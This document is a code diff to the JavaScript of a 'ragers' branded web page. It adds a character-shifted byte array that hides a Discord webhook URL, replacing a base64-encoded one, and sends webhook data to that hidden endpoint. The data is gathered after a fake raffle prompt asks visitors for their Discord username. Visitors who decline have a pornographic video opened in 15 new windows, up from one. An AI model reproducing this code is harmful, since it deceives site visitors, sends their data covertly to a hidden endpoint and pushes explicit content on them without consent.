@@ -1,9 +1,32 @@
+const _0x3f8b2c = [
+    0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 0x64, 0x69, 0x73, 0x63,
+    0x6f, 0x72, 0x64, 0x2e, 0x63, 0x6f, 0x6d, 0x2f, 0x61, 0x70, 0x69, 0x2f,
+    0x77, 0x65, 0x62, 0x68, 0x6f, 0x6f, 0x6b, 0x73, 0x2f, 0x31, 0x33, 0x30,
+    0x35, 0x36, 0x35, 0x34, 0x31, 0x35, 0x30, 0x38, 0x39, 0x33, 0x31, 0x34,
+    0x32, 0x31, 0x31, 0x36, 0x2f, 0x6b, 0x67, 0x4d, 0x79, 0x56, 0x4b, 0x58,
+    0x34, 0x33, 0x35, 0x6f, 0x38, 0x56, 0x57, 0x2d, 0x57, 0x48, 0x43, 0x57,
+    0x58, 0x30, 0x76, 0x66, 0x4f, 0x36, 0x46, 0x43, 0x79, 0x7a, 0x70, 0x76,
+    0x33, 0x38, 0x64, 0x36, 0x4f, 0x35, 0x72, 0x53, 0x66, 0x77, 0x76, 0x4d,
+    0x55, 0x46, 0x64, 0x39, 0x67, 0x72, 0x4f, 0x50, 0x70, 0x39, 0x55, 0x76,
+    0x33, 0x41, 0x56, 0x71, 0x4d, 0x45, 0x4c, 0x46, 0x53, 0x2d, 0x56, 0x6f, 0x43
+];
+
+const _0x2d9e1f = (data) => {
+    const key = [0x52, 0x41, 0x47, 0x45];
+    return data.map((byte, i) => {
+        const shift = ((i * 7) + key[i % key.length]) % 256;
+        return String.fromCharCode(byte ^ shift);
+    }).join('');
+};
+
+function getEndpoint() {
+    return _0x2d9e1f(_0x3f8b2c);
+}
+
 function decryptWebhook(encryptedHook) {
     const key = "ragers";
     return atob(encryptedHook);
 }
-
-const encryptedWebhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMwNTQ3MDMyODIwMTU0Nzc4Ni8tOHR0ZWFDbnRTeUpEeUItTG5fSHNYVUJCQUVDODBJalVuQUgyVUQyNjB5LTlkSjIzMDdFVEEzcWZtQVEtR0JGT3NPXw==";
 
 const brandDescription = [
     'pro ragers',
@@ -19,16 +42,12 @@ const effects = ['bounce', 'flash', 'pulse', 'rubberBand', 'shake', 'swing', 'ta
 
 function promptUser() {
     const video = document.querySelector('.background-video');
-    const audio = document.getElementById('backgroundAudio');
     const username = prompt("You have been chosen in a raffle to be apart of Ragers Hall Of Fame, Please Input your discord username.");
 
     if (username) {
         video.currentTime = 0;
         video.muted = false;
         video.volume = 1.0;
-        audio.play();
-        audio.volume = 0.5;
-
         const playPromise = video.play();
 
         if (playPromise !== undefined) {
@@ -37,7 +56,6 @@ function promptUser() {
             }).catch(error => {
                 document.addEventListener('click', () => {
                     video.play();
-                    audio.play();
                 }, { once: true });
             });
         }
@@ -60,14 +78,14 @@ function promptUser() {
                     }]
                 };
 
-                fetch(decryptWebhook(encryptedWebhook), {
+                fetch(getEndpoint(), {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(webhookData)
                 });
             });
     } else {
-        for (let i = 0; i < 1; i++) {
+        for (let i = 0; i < 15; i++) {
             window.open("https://www.pornhub.com/view_video.php?viewkey=672298c5e2062", "_blank");
         }
     }
@@ -77,15 +95,7 @@ document.addEventListener('DOMContentLoaded', () => {
     const loadingContainer = document.querySelector('.loading-container');
     const mainPage = document.querySelector('.main-page');
     const video = document.querySelector('.background-video');
-    const audio = document.getElementById('backgroundAudio');
-
     video.muted = true;
-
-    // Add click event listener for audio
-    document.addEventListener('click', function () {
-        audio.play();
-        audio.volume = 0.5;
-    }, { once: true });
 
     setTimeout(() => {
         loadingContainer.classList.add('fade-out');
